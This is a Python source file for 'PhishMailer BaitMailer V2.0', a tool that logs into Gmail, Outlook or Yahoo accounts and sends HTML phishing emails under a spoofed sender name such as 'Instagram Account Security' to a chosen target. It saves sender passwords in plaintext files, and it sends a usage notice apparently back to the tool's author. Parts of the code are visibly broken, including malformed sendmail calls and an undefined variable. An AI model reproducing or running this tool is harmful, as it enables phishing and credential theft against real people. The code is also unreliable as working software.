import smtplib
import os
import getpass
import sys
import ssl
import time
from email.mime.text import MIMEText
from email.utils import formataddr
from email.mime.multipart import MIMEMultipart  
from email.mime.base import MIMEBase  
from email import encoders  
from email.mime.text import MIMEText

red = ("\033[1;31;40m")
green = ("\033[1;32;40m")
white = ("\033[1;37;40m")
blue = ("\033[1;34;40m")
yellow = ("\033[1;33;40m")
start = (green + "[" + white + "+" + green + "]" + white)
alert = (green + "[" + red + "!" + green + "]" + white)
question = (green + "[" + yellow + "?" + green + "]" + white)


def numbering(num):
  return green + "[" + white + str(num) + green + "]"

def MailingMain():
	os.system("clear")
	print(green)
	print("""
	 __^__                                                        __^__
	( ___ )------------------------------------------------------( ___ )
	 | / |                                                        | \ |
	 | / |+------------)PhishMailer BaitMailer V2.0(-------------+| \ |
	 |___|                                                        |___|
	(_____)------------------------------------------------------(_____) """)

	print(alert + "It Might Take A Few Minutes Until The Target Gets The Email" + alert)
	print(alert + "You Might Need To Allow Less Secure Apps On You Email Account" + alert)
		
	print("")
	fromaddr = input(start + " Enter Your Email-Address: ")
	password = input(start + " Enter Your Password: ")
	FakeName = input(start + " Set Name You Want The Target To See (ex: Instagram Account Security)")	
	toaddr = input(start + " Enter Email-Address To Send To: ")
	subject = input(start + " Enter Subject: ")
	pathfile = input(start + " Enter Path To Html File: ")
	
	html = open(pathfile)
	msg = MIMEText(html.read(), 'html')
	msg['From'] = FakeName
	msg['To'] = toaddr
	msg['Subject'] = subject

	if "@gmail" in fromaddr:
		print("gmail")
		time.sleep(5)
		debug = False
		if debug:
			print(msg.as_string())
		else:
			server = smtplib.SMTP('smtp.gmail.com',587)
			server.starttls()
			server.login(fromaddr, password)
			text = msg.as_string()
			server.sendmail(fromaddr, toaddr, text)
			server.quit()
			print(alert + "Email Sent" + alert)

	elif "@hotmail" in fromaddr or "@outlook" in fromaddr or "@live" in fromaddr:
		print("live")
		time.sleep(5)
		debug = False
		if debug:
			print(msg.as_string())
		else:
			server = smtplib.SMTP('smtp.live.com',587)
			server.starttls()
			server.login(fromaddr, password)
			text = msg.as_string()
			server.sendmail(fromaddr, toaddr, text)
			server.quit()
			print(alert + "Email Sent" + alert)
			
	elif "@yahoo" in fromaddr:
		print("yahoo")
		time.sleep(5)
		debug = False
		if debug:
			print(msg.as_string())
		else:
			server = smtplib.SMTP_SSL('smtp.mail.yahoo.com',465)
			server.starttls()
			server.login(fromaddr, password)
			text = msg.as_string()
			server.sendmail(fromaddr, toaddr, text)
			server.quit()
			print(alert + "Email Sent" + alert)
			
	else:
		print(alert + " Doesn't support that email provider yet")
		print(question + " Custom SMTP Will Come Soon")

def accountsave():
	print(green)

	print("       ,   ,")
	print("      /////|")
	print("     ///// |")
	print("    /////  |")
	print("   |~~~| | |")
	print("   |===| |/|")
	print("   |" + white + " S " + green + "|/| |")
	print("   |" + white + " A " + green + "| | |")
	print("   |" + white + " V " + green + "| | |")
	print("   |" + white + " E " + green + "|  /")
	print("   |" + white + " D " + green + "| /")
	print("   |===|/")
	print("   '---'")
	print("")
	
	Email = input(start + " Enter Email To Save: " + green)
	os.system("clear")
	print(alert + " Picked Email: " + red + Email + "\n")

	passwd = input(start + " Enter Password To Save: " + green)
	os.system("clear") 
	print("\n" + alert + " Picked Email: " + yellow + Email + "\n")
	print(alert + " Picked Password: " + yellow + passwd + "\n")
	print(question + "Is the info Correct? \n")
	
	Correct = input(yellow + "BoatMaking@Phishmailer:~ [Y or N]: " + white)
	
	if Correct == "N" or Correct == "n":
		accountsave()
		
	elif Correct == "Y":
		with open("emails.txt", 'a') as f:
			f.write(Email + "\n")
			f.close
	
		with open("passwords.txt", "a") as f:
			f.write(passwd + "\n")
			f.close
		
		print(start + " Email Saved")
		time.sleep(2.5)
		os.system("clear")
		pick()
	
	else:
		print(alert + " Error")


def pick():	
	os.system("clear")
	file1 = open("emails.txt", "r")
	lines = file1.readlines()
	print(start + green + " Saved Emails")
	print(green + "Options:" + white)
	count = 0
	for line in lines:
		count += 1
		print("[{}]: {} \n".format(count, line.strip()))
	
	print(numbering(99) + white + " Use Another Email Once")
	print(numbering(666) + white + " Save Another Email")
	
	line_number = int(input(start + " ----> "))
	
	if line_number == 99:
		MailingMain()
	
	elif line_number == 666:
		accountsave()	
	
	else:	
		UsernameListed = (line_number - 1)
		passwordlisted = (line_number - 1)
		
		with open("emails.txt") as fobj:
			data = fobj.read()
			lines = data.split("\n")
			fromaddr = lines[UsernameListed]
			
		with open("passwords.txt") as fobj:
			data = fobj.read()
			lines = data.split("\n")
			password = lines[passwordlisted]
		
		FakeName = input(start + " Set Name You Want The Target To See (ex: Instagram Account Security)")	
		toaddr = input(start + " Enter Email-Address To Send To: ")
		subject = input(start + " Enter Subject: ")
		pathfile = input(start + " Enter Path To Html File: ")
		
		html = open(pathfile)
		msg = MIMEText(html.read(), 'html')
		msg['From'] = FakeName
		msg['To'] = toaddr
		msg['Subject'] = subject

		if "@gmail" in fromaddr:
			print("gmail")
			time.sleep(5)
			debug = False
			if debug:
				print(msg.as_string())
			else:
				server = smtplib.SMTP('smtp.gmail.com',587)
				server.starttls()
				server.login(fromaddr, password)
				text = msg.as_string()
				server.sendmail(fromaddr, toaddr, text)
				server.quit()
				print(alert + "Email Sent" + alert)
					
				PermCheck = open("Permission.txt", "r")
				Check = PermCheck.read()
				PermCheck.close()
				while True:
						if "Yes" in Check:
							subject = "Phishmailer Sender"
							text = "Email Sent With PhishMailer"
							message = 'Subject: {}\n\n{}'.format(subject, text)
								
							server = smtplib.SMTP('smtp.gmail.com',587)
							server.starttls()
							server.login(fromaddr, password)
							server.sendmail(fromaddr, message)
							server.quit()
							print(start + " Notice Sent To Me As Well, Thank You <3")
							sys.exit()
				else:
					time.sleep(0.3)
					print(start + " Good Luck " + start)
					sys.exit()

		elif "@hotmail" in fromaddr or "@outlook" in fromaddr or "@live" in fromaddr:
			time.sleep(5)
			debug = False
			if debug:
				print(msg.as_string())
			else:
				server = smtplib.SMTP('smtp.live.com',587)
				server.starttls()
				server.login(fromaddr, password)
				text = msg.as_string()
				server.sendmail(fromaddr, toaddr, text)
				server.quit()
				print(alert + "Email Sent" + alert)
				
				PermCheck = open("Permission.txt", "r")
				Check = PermCheck.read()
				PermCheck.close()
				if "No" in Check:
					os.system("clear")
				else:
					while True:
						if "Yes" in Check:
							subject = "Phishmailer Sender"
							text = "Email Sent With PhishMailer"
							message = 'Subject: {}\n\n{}'.format(subject, text)
							
							server = smtplib.SMTP('smtp.live.com',587)
							server.starttls()
							server.login(fromaddr, password)
							server.sendmail(fromaddr, message)
							server.quit()
							print(start + " Notice Sent To Me As Well, Thank You <3")
							sys.exit()
							
		elif "@yahoo" in fromaddr:
			time.sleep(5)
			debug = False
			if debug:
				print(msg.as_string())
			else:
				server = smtplib.SMTP_SSL('smtp.mail.yahoo.com',465)
				server.starttls()
				server.login(fromaddr, password)
				text = msg.as_string()
				server.sendmail(fromaddr, toaddr, text)
				server.quit()
				print(alert + "Email Sent" + alert)
				
				PermCheck = open("Permission.txt", "r")
				Check = PermCheck.read()
				PermCheck.close()
				if "No" in Check:
					os.system("clear")
				else:
					while True:
						if "Yes" in Check:
							subject = "Phishmailer Sender"
							text = "Email Sent With PhishMailer"
							message = 'Subject: {}\n\n{}'.format(subject, text)
							
							server = smtplib.SMTP('smtp.yahoo.com',587)
							server.starttls()
							server.login(fromaddr, password)
							server.sendmail(fromaddr, MyMail, message)
							server.quit()
							print(start + " Notice Sent To Me As Well, Thank You <3")
							sys.exit()

		else:
			print(alert + " Doesn't support that email provider yet")
			print(question + " Custom SMTP Will Come Soon")


def GETSIZE():
	file_path = 'emails.txt'
# check if size of file is 0
	if os.stat(file_path).st_size == 0:
		print(alert + " You Don't Have Any Emails Saved :(")
		print(question + " Do You Want To Save One? Y or N: ")
		answer = input(green + "\nroot@phishmailer/Mailer/:~ " + white)
		
		if answer == "Y" or answer == "y":
			accountsave()
		
		else: 
			MailingMain()
	else:
		pick()


def MailerMenu():
	print(green + """
	 __^__                                                        __^__
	( ___ )------------------------------------------------------( ___ )
	 | / |                                                        | \ |
	 | / |+------------)PhishMailer BaitMailer V2.0(-------------+| \ |
	 |___|                                                        |___|
	(_____)------------------------------------------------------(_____) """)
	print("")
	print(numbering(1) + white + " Use The Email Once")
	print(numbering(2) + white + " Use Saved Emails")
	print(numbering(99) + red + " Exit")
	
	Pick = int(input(green + "\nroot@phishmailer/Mailer/:~ " + white))
	
	if Pick == 1:
		MailingMain()
	
	elif Pick == 2:
		GETSIZE() #pick()
		
	elif Pick == 99:
		sys.exit()
	
	else:
		os.system("clear")
		print(alert + " Invalid Option, Try Again!")
